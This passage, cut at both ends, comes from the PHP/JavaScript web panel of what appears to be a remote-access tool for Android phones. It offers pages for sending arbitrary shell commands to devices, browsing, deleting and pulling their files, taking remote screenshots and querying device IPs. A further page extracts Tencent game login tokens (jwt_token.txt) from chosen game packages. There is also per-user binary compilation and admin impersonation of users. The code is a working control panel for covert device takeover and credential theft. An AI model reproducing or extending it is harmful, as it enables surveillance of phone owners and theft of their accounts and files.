                <span id="cmdDeviceLabel"><?=$selected_device?'已选择: '.htmlspecialchars($selected_device):'未选择设备'?></span>
            </div>
            <div class="cmd-area">
                <textarea class="cmd-textarea" placeholder="输入命令..." id="cmdTextarea"></textarea>
                <button class="btn" onclick="sendCmdAjax()" id="sendBtn" <?=$selected_device?'':'disabled'?>>🚀 发送</button>
            </div>
            <div id="cmdStatus" style="margin-top:10px;font-size:0.85em;color:#7f93b5"></div>
        </div>
        <div id="resultContainer"></div>
    </div>

    <div id="page-files" class="page">
        <div class="page-header"><h1 class="page-title">📁 文件管理</h1><p class="page-desc">浏览和管理设备文件（双击文件可请求上传）</p></div>
        <div class="cmd-section">
            <div class="file-toolbar">
                <select id="fileDevice" onchange="browseDir()"><option value="">选择设备</option><?php foreach($device_list as $d):if($d['online']):?><option value="<?=htmlspecialchars($d['device_key'])?>"><?=htmlspecialchars($d['device_key'])?></option><?php endif;endforeach;?></select>
                <input type="text" class="file-path-input" id="filePath" value="/storage/emulated/0" placeholder="输入路径...">
                <button class="btn" onclick="browseDir()">📂 浏览</button>
                <button class="btn gray" onclick="fileOp('mkdir')">📁 新建文件夹</button>
                <button class="btn gray" onclick="fileOp('mkfile')">📄 新建文件</button>
            </div>
            <div class="file-breadcrumb" id="fileBreadcrumb"></div>
            <div class="file-list" id="fileList"><div class="file-loading">选择设备并浏览目录</div></div>
        </div>
    </div>

    <div id="page-screenshot" class="page">
        <div class="page-header"><h1 class="page-title">📸 实时截屏</h1><p class="page-desc">远程查看设备屏幕</p></div>
        <div class="cmd-section">
            <div class="device-select-row">
                <select id="screenshotDevice"><option value="">选择设备</option><?php foreach($device_list as $d):if($d['online']):?><option value="<?=htmlspecialchars($d['device_key'])?>"><?=htmlspecialchars($d['device_key'])?></option><?php endif;endforeach;?></select>
                <button class="btn" onclick="takeScreenshot()" id="screenshotBtn">📸 立即截屏</button>
            </div>
            <span id="screenshotStatus" style="font-size:0.85em;color:#7f93b5"></span>
            <div id="screenshotResult" style="margin-top:15px;display:none"><img id="screenshotImg" style="max-width:100%;border-radius:10px;box-shadow:0 2px 12px rgba(0,0,0,0.1)" alt="截屏"><p style="margin-top:8px;font-size:0.8em;color:#7f93b5" id="screenshotInfo"></p></div>
        </div>
    </div>
   <!-- IP查询页面 -->
<div id="page-ipquery" class="page">
    <div class="page-header">
        <h1 class="page-title">🌐 IP查询</h1>
        <p class="page-desc">查询设备当前IP地址信息</p>
    </div>
    <div class="cmd-section">
        <div class="device-select-row">
            <select id="ipDevice"><option value="">选择设备</option><?php foreach($device_list as $d):if($d['online']):?><option value="<?=htmlspecialchars($d['device_key'])?>"><?=htmlspecialchars($d['device_key'])?></option><?php endif;endforeach;?></select>
            <button class="btn" onclick="queryIP()" id="ipQueryBtn">🔍 一键查询</button>
        </div>
        <span id="ipQueryStatus" style="font-size:0.85em;color:#7f93b5"></span>
        <div id="ipResult" style="margin-top:15px;display:none">
            <div class="result-section">
                <div class="result-header"><h3>📋 IP查询结果</h3></div>
                <pre id="ipResultContent" style="white-space: pre-wrap;word-break: break-all;"></pre>
            </div>
        </div>
    </div>
</div>



<!-- 游戏授权获取页面 -->
<div id="page-gameauth" class="page">
    <div class="page-header">
        <h1 class="page-title">🎮 授权获取</h1>
        <p class="page-desc">获取腾讯游戏授权文件（jwt_token.txt）</p>
    </div>
    <div class="cmd-section">
        <div class="alert" style="background:rgba(255,159,67,0.1);color:#ff9f43;font-size:0.85em">
            📌 理论支持腾讯全游戏<br>
            如没有想获取的游戏可自己输入包名<br>
            <small style="color:#7f93b5">常见包名：com.tencent.tmgp.pubgmhd(和平精英)、com.tencent.tmgp.sgame(王者荣耀)、com.tencent.tmgp.cf(穿越火线)</small>
        </div>
        <div class="device-select-row">
            <select id="gameDevice"><option value="">选择设备</option><?php foreach($device_list as $d):if($d['online']):?><option value="<?=htmlspecialchars($d['device_key'])?>"><?=htmlspecialchars($d['device_key'])?></option><?php endif;endforeach;?></select>
        </div>
        <div class="file-toolbar" style="margin-top:10px">
            <input type="text" class="file-path-input" id="gamePackageName" placeholder="输入游戏包名..." style="max-width:400px">
            <button class="btn" onclick="getGameAuth()" id="gameAuthBtn">🎮 一键获取</button>
        </div>
        <span id="gameAuthStatus" style="font-size:0.85em;color:#7f93b5"></span>
        <div id="gameAuthResult" style="margin-top:15px;display:none">
            <div class="result-section">
                <div class="result-header"><h3>📋 获取结果</h3></div>
                <div id="gameAuthContent"></div>
            </div>
        </div>
    </div>
</div>
    <div id="page-apikey" class="page">
        <div class="page-header"><h1 class="page-title">🔑 密钥与编译</h1></div>
        <div class="apikey-box"><h3>📋 API Key</h3><div class="apikey-display" id="apiKeyDisplay"><?=htmlspecialchars($api_key)?></div><button class="btn" onclick="copyApiKey()">📋 复制</button></div>
        <div class="apikey-box">
            <h3>🔨 一键编译</h3>
            <p style="color:#7f93b5;font-size:0.85em;margin-bottom:15px">编译二进制文件 <span style="color:#ff9f43">(仅一次)</span></p>
            <div class="build-buttons">
<button class="btn" id="buildBtn" onclick="startBuild()">🔨 一键编译</button>
                <?php if($binary_url):?><a href="<?=htmlspecialchars($binary_url)?>" class="btn green" download>💾 下载二进制</a><?php endif;?>
            </div>
            <div class="progress-wrap" id="buildProgress"><div class="progress-bar-outer"><div class="progress-bar-inner" id="progressBar"></div></div><p class="progress-text" id="progressText">准备中...</p></div>
            <div id="buildResult" style="margin-top:15px"></div>
        </div>
    </div>

    <?php if($is_admin):?>
    <div id="page-admin" class="page">
        <div class="page-header"><h1 class="page-title">👑 用户管理</h1><p class="page-desc">管理所有用户账户</p></div>
        <div class="stats-grid">
            <div class="stat-card"><div class="sicon">👥</div><div class="value"><?=count($all_users)?></div><div class="label">总用户数</div></div>
            <div class="stat-card online"><div class="sicon">🟢</div><div class="value"><?=$online_count?></div><div class="label">当前在线设备</div></div>
        </div>
        <div class="cmd-section">
            <h3>📋 用户列表</h3>
            <div class="admin-table-wrap">
                <table class="admin-table">
                    <thead><tr><th>ID</th><th>用户名</th><th>邮箱</th><th>设备标识</th><th>API Key</th><th>编译</th><th>注册时间</th><th>操作</th></tr></thead>
                    <tbody>
                        <?php foreach($all_users as $u):?>
                        <tr>
                            <td><?=$u['id']?></td>
                            <td style="font-weight:600"><?=htmlspecialchars($u['username'])?><?php if($u['username']==='admin'):?> 👑<?php endif;?></td>
                            <td style="font-size:0.85em;color:#7f93b5"><?=htmlspecialchars($u['email'])?></td>
                            <td style="font-size:0.8em;font-family:monospace"><?=htmlspecialchars(substr($u['device_key'],0,16))?>...</td>
                            <td style="font-size:0.8em;font-family:monospace"><?=htmlspecialchars(substr($u['api_key']??'',0,16))?>...</td>
                            <td style="text-align:center"><?php if(($u['build_count']??0) > 0):?><span class="badge success">✅</span><?php else:?><span class="badge wait">⬜</span><?php endif;?></td>
                            <td style="font-size:0.8em;color:#7f93b5"><?=htmlspecialchars($u['created_at'])?></td>
                            <td><button class="btn" style="padding:4px 12px;font-size:0.75em" onclick="loginAsUser(<?=$u['id']?>)">🔑 切换</button></td>
                        </tr>
                        <?php endforeach;?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    <?php endif;?>
</div>

<script>
// ==================== 侧边栏控制 ====================
function toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('open');
    document.getElementById('sidebarOverlay').classList.toggle('active');
}

function closeSidebar() {
    document.getElementById('sidebar').classList.remove('open');
    document.getElementById('sidebarOverlay').classList.remove('active');
}

function navTo(page) {
    showPage(page);
    closeSidebar();
}

function showPage(p) {
    var pages = ['status','devices','commands','files','screenshot','apikey','ipquery','gameauth'<?php if($is_admin):?>,'admin'<?php endif;?>];
    for (var i = 0; i < pages.length; i++) {
        var page = document.getElementById('page-' + pages[i]);
        if (page) page.style.display = 'none';
    }
    var target = document.getElementById('page-' + p);
    if (target) target.style.display = 'block';
    var navs = document.querySelectorAll('.nav-item');
    for (var i = 0; i < navs.length; i++) navs[i].classList.remove('active');
    var map = {status:0, devices:1, commands:2, files:3, screenshot:4, apikey:5, ipquery:6, gameauth:7<?php if($is_admin):?>, admin:8<?php endif;?>};
    if (map[p] !== undefined && navs[map[p]]) navs[map[p]].classList.add('active');
    window.scrollTo({top: 0, behavior: 'smooth'});
}

function onCmdDeviceChange() {
    var k = document.getElementById('cmdDevice').value;
    document.getElementById('sendBtn').disabled = !k;
    document.getElementById('cmdDeviceLabel').textContent = k ? '已选择: ' + k : '未选择设备';
}

// ==================== AJAX命令发送 ====================
var cmdPollTimer = null;
var cmdLastPoll = 0;

function sendCmdAjax() {
    var device = document.getElementById('cmdDevice').value;
    var cmd = document.getElementById('cmdTextarea').value.trim();
    
    if (!device) { toast('请先选择设备', 'error'); return; }
    if (!cmd) { toast('请输入命令', 'error'); return; }
    
    var btn = document.getElementById('sendBtn');
    btn.disabled = true;
    btn.textContent = '发送中...';
    
    var statusEl = document.getElementById('cmdStatus');
    statusEl.textContent = '正在发送命令...';
    statusEl.style.color = '#888';
    
    if (cmdPollTimer) { clearInterval(cmdPollTimer); cmdPollTimer = null; }
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 15000;
    
    xhr.onload = function() {
        btn.disabled = false;
        btn.textContent = '🚀 发送';
        
        if (xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                if (d.success) {
                    cmdLastPoll = d.time || Math.floor(Date.now() / 1000);
                    statusEl.textContent = '命令已发送，等待设备响应...';
                    statusEl.style.color = '#00d4ff';
                    pollCmdResult(device);
                } else {
                    statusEl.textContent = '发送失败: ' + (d.error || '未知错误');
                    statusEl.style.color = '#ff9f43';
                    toast(d.error || '发送失败', 'error');
                }
            } catch(e) {
                statusEl.textContent = '响应解析失败';
                statusEl.style.color = '#ff9f43';
                toast('解析失败', 'error');
            }
        } else {
            statusEl.textContent = '请求失败: ' + xhr.status;
            statusEl.style.color = '#ff9f43';
            toast('请求失败', 'error');
        }
    };
    
    xhr.onerror = function() {
        btn.disabled = false;
        btn.textContent = '🚀 发送';
        statusEl.textContent = '网络错误';
        statusEl.style.color = '#ff9f43';
        toast('网络错误', 'error');
    };
    
    xhr.ontimeout = function() {
        btn.disabled = false;
        btn.textContent = '🚀 发送';
        statusEl.textContent = '请求超时';
        statusEl.style.color = '#ff9f43';
        toast('请求超时', 'error');
    };
    
    xhr.send('action=send_cmd&key=' + encodeURIComponent(device) + '&cmd=' + encodeURIComponent(cmd));
}

function pollCmdResult(device) {
    var pollCount = 0;
    var maxPolls = 75;
    
    var statusEl = document.getElementById('cmdStatus');
    
    cmdPollTimer = setInterval(function() {
        pollCount++;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.timeout = 10000;
        
        xhr.onload = function() {
            if (xhr.status === 200 && xhr.responseText) {
                try {
                    var d = JSON.parse(xhr.responseText);
                    if (d.has_result && d.result) {
                        clearInterval(cmdPollTimer);
                        cmdPollTimer = null;
                        displayCmdResult(d.result);
                        statusEl.textContent = '✓ 已收到响应';
                        statusEl.style.color = '#00b894';
                        return;
                    }
                } catch(e) {}
            }
            
            statusEl.textContent = '等待响应... (' + pollCount + 's)';
            
            if (pollCount >= maxPolls) {
                clearInterval(cmdPollTimer);
                cmdPollTimer = null;
                statusEl.textContent = '⚠ 等待超时，设备可能离线';
                statusEl.style.color = '#ff9f43';
                toast('设备响应超时', 'error');
            }
        };
        
        xhr.onerror = function() {
            if (pollCount >= maxPolls) {
                clearInterval(cmdPollTimer);
                cmdPollTimer = null;
            }
        };
        
        xhr.send('action=poll_result&key=' + encodeURIComponent(device) + '&last_poll=' + cmdLastPoll);
    }, 1500);
}

function displayCmdResult(result) {
    var container = document.getElementById('resultContainer');
    var exitCode = result.exit_code || '0';
    var isSuccess = (exitCode === '0');
    
    var html = '<div class="result-section"><div class="result-header"><h3>📋 命令结果</h3>';
    html += '<span class="exit-code ' + (isSuccess ? 'success' : 'error') + '">';
    html += isSuccess ? '✓ 成功' : '✗ 退出码: ' + exitCode;
    html += '</span></div>';
    html += '<div class="result-meta">' + escapeHtml(result.cmd || '') + ' · ' + (result.time || '') + '</div>';
    html += '<pre>' + escapeHtml(result.output || '(无输出)') + '</pre></div>';
    
    container.innerHTML = html;
}

function selectDevice(k) {
    var cmdSelect = document.getElementById('cmdDevice');
    if (cmdSelect) {
        for (var i = 0; i < cmdSelect.options.length; i++) {
            if (cmdSelect.options[i].value === k) { cmdSelect.options[i].selected = true; break; }
        }
    }
    document.getElementById('sendBtn').disabled = false;
    document.getElementById('cmdDeviceLabel').textContent = '已选择: ' + k;
    navTo('commands');
}

// ==================== 工具函数 ====================
function copyApiKey() {
    var k = document.getElementById('apiKeyDisplay').textContent;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(k).then(function() { toast('已复制'); }).catch(function() { fallbackCopy(k); });
    } else { fallbackCopy(k); }
}

function fallbackCopy(text) {
    var t = document.createElement('textarea');
    t.value = text; t.style.position = 'fixed'; t.style.opacity = '0'; t.style.left = '-9999px';
    document.body.appendChild(t); t.select();
    try { document.execCommand('copy'); toast('已复制'); } catch(e) { toast('复制失败', 'error'); }
    document.body.removeChild(t);
}

function toast(m, type) {
    var d = document.createElement('div');
    d.className = 'toast ' + (type || 'success');
    d.textContent = m;
    document.body.appendChild(d);
    setTimeout(function() { 
        d.style.opacity = '0'; d.style.transition = 'opacity 0.3s';
        setTimeout(function() { d.remove(); }, 300);
    }, 2500);
}

function escapeHtml(str) {
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    return div.innerHTML;
}

// ==================== 文件管理 ====================
var currentDir = '/storage/emulated/0';
var fileClickTimer = null;
var fileClickCount = 0;
var lastClickedFile = null;

function getDevice() { 
    var sel = document.getElementById('fileDevice'); 
    return sel ? sel.value : ''; 
}

function browseDir(dir) {
    if (dir) currentDir = dir;
    var device = getDevice();
    if (!device) { toast('请选择设备', 'error'); return; }
    document.getElementById('filePath').value = currentDir;
    document.getElementById('fileList').innerHTML = '<div class="file-loading">加载中...</div>';
    updateBreadcrumb(currentDir);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                try {
                    var d = JSON.parse(xhr.responseText);
                    if (d.error) { document.getElementById('fileList').innerHTML = '<div class="file-loading">❌ ' + d.error + '</div>'; }
                    else { renderFileList(d.files, d.dir); }
                } catch(e) { document.getElementById('fileList').innerHTML = '<div class="file-loading">❌ 解析失败</div>'; }
            } else { document.getElementById('fileList').innerHTML = '<div class="file-loading">❌ 请求失败</div>'; }
        }
    };
    xhr.send('browse=1&device=' + encodeURIComponent(device) + '&dir=' + encodeURIComponent(currentDir));
}

function updateBreadcrumb(dir) {
    var parts = dir.split('/').filter(function(p) { return p !== ''; });
    var html = '<a onclick="browseDir(\'/\')">📁 /</a>';
    var path = '';
    for (var i = 0; i < parts.length; i++) { 
        path += '/' + parts[i]; 
        html += '<span> › </span><a onclick="browseDir(\'' + path.replace(/'/g, "\\'") + '\')">' + parts[i] + '</a>'; 
    }
    document.getElementById('fileBreadcrumb').innerHTML = html;
}

function renderFileList(files, dir) {
    currentDir = dir;
    var html = '';
    if (dir !== '/') { 
        var parent = dir.substring(0, dir.lastIndexOf('/')) || '/'; 
        html += '<div class="file-item" onclick="browseDir(\'' + parent.replace(/'/g, "\\'") + '\')" style="background:rgba(0,212,255,0.06)"><div class="ficon">📂</div><div class="finfo"><div class="fname">..</div></div></div>'; 
    }
    for (var i = 0; i < files.length; i++) {
        var f = files[i];
        var icon = f.is_dir ? '📁' : getFileIcon(f.name);
        var safePath = (dir + '/' + f.name);
        var escapedPath = safePath.replace(/'/g, "\\'");
        
        if (f.is_dir) {
            html += '<div class="file-item" onclick="browseDir(\'' + escapedPath + '\')">';
        } else {
            html += '<div class="file-item file-clickable" data-path="' + escapeHtml(safePath) + '" data-name="' + escapeHtml(f.name) + '">';
        }
        html += '<div class="ficon">' + icon + '</div><div class="finfo"><div class="fname">' + escapeHtml(f.name) + '</div><div class="fmeta">' + (f.perm||'') + '</div></div>';
        html += '<div class="fsize">' + (f.size||'-') + '</div><div class="fdate">' + (f.date||'') + '</div>';
        html += '<button class="btn red" style="padding:4px 10px;font-size:0.7em" onclick="event.stopPropagation();deleteFile(\'' + escapedPath + '\')">🗑</button>';
        html += '<button class="btn gray" style="padding:4px 10px;font-size:0.7em" onclick="event.stopPropagation();renameFile(\'' + escapedPath + '\')">✏️</button>';
        html += '</div>';
    }
    document.getElementById('fileList').innerHTML = html;
    
    // 绑定文件的双击检测
    bindFileClickEvents();
}

function bindFileClickEvents() {
    var items = document.querySelectorAll('.file-clickable');
    for (var i = 0; i < items.length; i++) {
        (function(item) {
            item.addEventListener('click', function(e) {
                // 防止按钮点击触发
                if (e.target.tagName === 'BUTTON') return;
                
                var path = item.getAttribute('data-path');
                var name = item.getAttribute('data-name');
                
                var now = Date.now();
                
                if (lastClickedFile === path && (now - fileClickCount) < 500) {
                    // 双击检测成功
                    clearTimeout(fileClickTimer);
                    lastClickedFile = null;
                    fileClickCount = 0;
                    requestUploadFile(path, name);
                } else {
                    // 第一次点击
                    lastClickedFile = path;
                    fileClickCount = now;
                    
                    // 高亮选中
                    document.querySelectorAll('.file-item').forEach(function(el) { el.classList.remove('selected'); });
                    item.classList.add('selected');
                    
                    // 500ms后重置
                    if (fileClickTimer) clearTimeout(fileClickTimer);
                    fileClickTimer = setTimeout(function() {
                        lastClickedFile = null;
                        fileClickCount = 0;
                    }, 500);
                }
            });
        })(items[i]);
    }
}

function getFileIcon(name) {
    var ext = name.split('.').pop().toLowerCase();
    var icons = {apk:'📦',zip:'🗜',png:'🖼',jpg:'🖼',jpeg:'🖼',gif:'🖼',mp4:'🎬',mp3:'🎵',pdf:'📕',doc:'📄',docx:'📄',txt:'📄',xml:'📄',json:'📄',html:'🌐',css:'🎨',js:'📜',sh:'⚙',so:'🔧',dex:'☕',jar:'☕',c:'📝',cpp:'📝',h:'📝',py:'🐍'};
    return icons[ext] || '📄';
}

// ==================== 文件上传请求 ====================
var uploadPollTimer = null;

function requestUploadFile(path, name) {
    var device = getDevice();
    if (!device) { toast('请先选择设备', 'error'); return; }
    
    // 显示确认弹窗
    showUploadConfirmModal(device, path, name);
}

function showUploadConfirmModal(device, path, name) {
    // 移除旧弹窗
    var oldModal = document.querySelector('.upload-modal');
    if (oldModal) oldModal.remove();
    var oldOverlay = document.querySelector('.upload-modal-overlay');
    if (oldOverlay) oldOverlay.remove();
    
    var overlay = document.createElement('div');
    overlay.className = 'upload-modal-overlay';
    
    var modal = document.createElement('div');
    modal.className = 'upload-modal';
    modal.innerHTML = '<h3>📤 上传文件确认</h3>' +
        '<p>确定要请求上传文件 <strong>' + escapeHtml(name) + '</strong> 吗？<br><small style="color:#7f93b5">' + escapeHtml(path) + '</small></p>' +
        '<p style="font-size:0.8em;color:#ff9f43">⚠ 只有你能访问上传的文件</p>' +
        '<div class="modal-buttons">' +
            '<button class="btn gray" id="cancelUpload">取消</button>' +
            '<button class="btn green" id="confirmUpload">✅ 确认上传</button>' +
        '</div>';
    
    document.body.appendChild(overlay);
    document.body.appendChild(modal);
    
    document.getElementById('cancelUpload').onclick = function() {
        modal.remove(); overlay.remove();
    };
    
    overlay.onclick = function() {
        modal.remove(); overlay.remove();
    };
    
    document.getElementById('confirmUpload').onclick = function() {
        modal.remove(); overlay.remove();
        doRequestUpload(device, path, name);
    };
}

function doRequestUpload(device, path, name) {
    toast('正在请求上传: ' + name, 'info');
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 30000;
    
    xhr.onload = function() {
        if (xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                if (d.success) {
                    toast(d.message || '上传请求已发送', 'success');
                    // 开始轮询上传状态
                    startUploadPoll(d.token, name);
                } else {
                    toast(d.error || '请求失败', 'error');
                }
            } catch(e) {
                toast('响应解析失败', 'error');
            }
        } else {
            toast('请求失败: ' + xhr.status, 'error');
        }
    };
    
    xhr.onerror = function() { toast('网络错误', 'error'); };
    xhr.ontimeout = function() { toast('请求超时', 'error'); };
    
    xhr.send('action=request_upload&key=' + encodeURIComponent(device) + '&path=' + encodeURIComponent(path));
}

function startUploadPoll(token, filename) {
    if (uploadPollTimer) clearInterval(uploadPollTimer);
    
    var pollCount = 0;
    var maxPolls = 120; // 最多轮询2分钟
    
    uploadPollTimer = setInterval(function() {
        pollCount++;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.timeout = 10000;
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var d = JSON.parse(xhr.responseText);
                    
                    if (d.status === 'completed') {
                        clearInterval(uploadPollTimer);
                        uploadPollTimer = null;
                        showDownloadPrompt(d, filename);
                    } else if (d.status === 'failed') {
                        clearInterval(uploadPollTimer);
                        uploadPollTimer = null;
                        toast('上传失败: ' + (d.error || '未知错误'), 'error');
                    } else if (d.status === 'error') {
                        clearInterval(uploadPollTimer);
                        uploadPollTimer = null;
                        toast(d.error || '发生错误', 'error');
                    }
                } catch(e) {}
            }
            
            if (pollCount >= maxPolls) {
                clearInterval(uploadPollTimer);
                uploadPollTimer = null;
                toast('上传超时，请重试', 'error');
            }
        };
        
        xhr.onerror = function() {
            if (pollCount >= maxPolls) {
                clearInterval(uploadPollTimer);
                uploadPollTimer = null;
            }
        };
        
        xhr.send('action=poll_upload&token=' + encodeURIComponent(token));
    }, 2000);
}

function showDownloadPrompt(data, originalName) {
    var overlay = document.createElement('div');
    overlay.className = 'upload-modal-overlay';
    
    var modal = document.createElement('div');
    modal.className = 'upload-modal';
    modal.innerHTML = '<h3>✅ 上传成功</h3>' +
        '<p>您刚才申请上传的 <strong>"' + escapeHtml(data.filename || originalName) + '"</strong> 已成功上传到服务器！</p>' +
        '<p style="color:#ff9f43;font-weight:600">请在1分钟内下载此文件</p>' +
        '<p style="font-size:0.8em;color:#7f93b5">文件大小: ' + (data.file_size || '未知') + '</p>' +
        '<div id="countdownDisplay" style="font-size:1.5em;font-weight:700;color:#00b894;margin:10px 0">60</div>' +
        '<div class="countdown-bar"><div class="countdown-bar-inner" id="countdownBar" style="width:100%"></div></div>' +
        '<div class="modal-buttons" style="margin-top:15px">' +
            '<button class="btn gray" id="closeDownloadModal">关闭</button>' +
            '<button class="btn green" id="downloadNowBtn">💾 立即下载</button>' +
        '</div>';
    
    document.body.appendChild(overlay);
    document.body.appendChild(modal);
    
    var downloadUrl = data.download_url || ('?download_upload=1&file=' + data.download_token);
    var countdown = 60;
    var downloadStarted = false;
    
    var countdownEl = document.getElementById('countdownDisplay');
    var barEl = document.getElementById('countdownBar');
    
    var countdownInterval = setInterval(function() {
        countdown--;
        if (countdownEl) countdownEl.textContent = countdown;
        if (barEl) barEl.style.width = Math.round(countdown / 60 * 100) + '%';
        
        if (countdown <= 10) {
            if (countdownEl) countdownEl.style.color = '#ff9f43';
        }
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            modal.remove();
            overlay.remove();
            if (!downloadStarted) {
                toast('文件已过期，已自动删除', 'error');
            }
        }
    }, 1000);
    
    document.getElementById('closeDownloadModal').onclick = function() {
        clearInterval(countdownInterval);
        modal.remove();
        overlay.remove();
        toast('请记得在1分钟内下载文件', 'info');
    };
    
    document.getElementById('downloadNowBtn').onclick = function() {
        downloadStarted = true;
        clearInterval(countdownInterval);
        
        // 替换为下载链接
        modal.innerHTML = '<h3>📥 开始下载</h3>' +
            '<p>文件: <strong>' + escapeHtml(data.filename || originalName) + '</strong></p>' +
            '<p style="color:#ff9f43">剩余时间: <span id="remainingTime">' + countdown + '</span> 秒</p>' +
            '<div class="countdown-bar"><div class="countdown-bar-inner" id="countdownBar2" style="width:' + Math.round(countdown / 60 * 100) + '%"></div></div>' +
            '<div class="modal-buttons" style="margin-top:15px">' +
                '<button class="btn gray" id="closeAfterDownload">关闭</button>' +
            '</div>';
        
        // 触发下载
        var a = document.createElement('a');
        a.href = downloadUrl;
        a.download = data.filename || originalName;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        // 继续倒计时
        var remainingInterval = setInterval(function() {
            countdown--;
            var rt = document.getElementById('remainingTime');
            if (rt) rt.textContent = countdown;
            var bar2 = document.getElementById('countdownBar2');
            if (bar2) bar2.style.width = Math.round(countdown / 60 * 100) + '%';
            
            if (countdown <= 0) {
                clearInterval(remainingInterval);
                modal.remove();
                overlay.remove();
            }
        }, 1000);
        
        document.getElementById('closeAfterDownload').onclick = function() {
            clearInterval(remainingInterval);
            modal.remove();
            overlay.remove();
        };
    };
    
    overlay.onclick = function() {
        // 不关闭，强制用户做选择
    };
}

// ==================== 文件操作 ====================
function fileOp(op) {
    var device = getDevice(); if (!device) { toast('请选择设备', 'error'); return; }
    var path;
    if (op === 'mkdir') { var name = prompt('新文件夹名称:'); if (!name) return; path = currentDir + '/' + name; }
    else if (op === 'mkfile') { var name = prompt('新文件名称:'); if (!name) return; path = currentDir + '/' + name; }
    else return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() { 
        if (xhr.readyState === 4 && xhr.status === 200) { 
            try { 
                var d = JSON.parse(xhr.responseText); 
                if (d.success) { toast(d.message||'操作成功'); setTimeout(browseDir, 1500); } 
                else { toast(d.message||'操作失败','error'); } 
            } catch(e) {} 
        } 
    };
    xhr.send('file_op=1&device='+encodeURIComponent(device)+'&op='+op+'&path='+encodeURIComponent(path));
}

function deleteFile(path) {
    var device = getDevice(); if (!device) return;
    if (!confirm('确定删除?\n'+path)) return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() { 
        if (xhr.readyState === 4 && xhr.status === 200) { 
            try { 
                var d = JSON.parse(xhr.responseText); 
                if (d.success) { toast('已删除'); setTimeout(browseDir, 1200); } 
                else { toast('删除失败','error'); } 
            } catch(e) {} 
        } 
    };
    xhr.send('file_op=1&device='+encodeURIComponent(device)+'&op=delete&path='+encodeURIComponent(path));
}

function renameFile(oldPath) {
    var device = getDevice(); if (!device) return;
    var newName = prompt('重命名为:', oldPath.split('/').pop());
    if (!newName || newName === oldPath.split('/').pop()) return;
    var newPath = oldPath.substring(0, oldPath.lastIndexOf('/')+1) + newName;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() { 
        if (xhr.readyState === 4 && xhr.status === 200) { 
            try { 
                var d = JSON.parse(xhr.responseText); 
                if (d.success) { toast('已重命名'); setTimeout(browseDir, 1200); } 
                else { toast('重命名失败','error'); } 
            } catch(e) {} 
        } 
    };
    xhr.send('file_op=1&device='+encodeURIComponent(device)+'&op=rename&path='+encodeURIComponent(oldPath)+'&new_path='+encodeURIComponent(newPath));
}

// ==================== 截屏 ====================
function takeScreenshot() {
    var device = document.getElementById('screenshotDevice').value;
    if (!device) { toast('请先选择设备', 'error'); return; }
    var btn = document.getElementById('screenshotBtn');
    var status = document.getElementById('screenshotStatus');
    var result = document.getElementById('screenshotResult');
    
    if (btn.disabled) return;
    
    btn.disabled = true; 
    btn.textContent = '截屏中...'; 
    status.textContent = '正在截屏，请等待...';
    status.style.color = '#00d4ff';
    result.style.display = 'none';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 180000;
    
    xhr.onload = function() {
        btn.disabled = false; 
        btn.textContent = '📸 立即截屏';
        
        if (xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                if (d.success) {
                    status.textContent = '✅ 截屏成功 - ' + new Date().toLocaleTimeString();
                    status.style.color = '#00b894';
                    document.getElementById('screenshotImg').src = d.image_url + '?t=' + Date.now();
                    document.getElementById('screenshotResult').style.display = 'block';
                    document.getElementById('screenshotInfo').textContent = '文件名: ' + d.filename + ' | 时间: ' + new Date().toLocaleString();
                } else {
                    status.textContent = '❌ ' + (d.error || '截屏失败');
                    status.style.color = '#ff9f43';
                    toast(d.error || '截屏失败', 'error');
                }
            } catch(e) {
                status.textContent = '❌ 响应解析失败';
                status.style.color = '#ff9f43';
            }
        } else {
            status.textContent = '❌ 服务器错误: ' + xhr.status;
            status.style.color = '#ff9f43';
        }
    };
    
    xhr.onerror = function() {
        btn.disabled = false; btn.textContent = '📸 立即截屏';
        status.textContent = '❌ 网络错误'; status.style.color = '#ff9f43';
    };
    
    xhr.ontimeout = function() {
        btn.disabled = false; btn.textContent = '📸 立即截屏';
        status.textContent = '❌ 请求超时'; status.style.color = '#ff9f43';
    };
    
    xhr.send('screenshot=1&device=' + encodeURIComponent(device));
}


// ==================== IP查询 ====================
function queryIP() {
    var device = document.getElementById('ipDevice').value;
    if (!device) { toast('请先选择设备', 'error'); return; }
    
    var btn = document.getElementById('ipQueryBtn');
    var status = document.getElementById('ipQueryStatus');
    var result = document.getElementById('ipResult');
    
    btn.disabled = true;
    btn.textContent = '查询中...';
    status.textContent = '正在查询IP...';
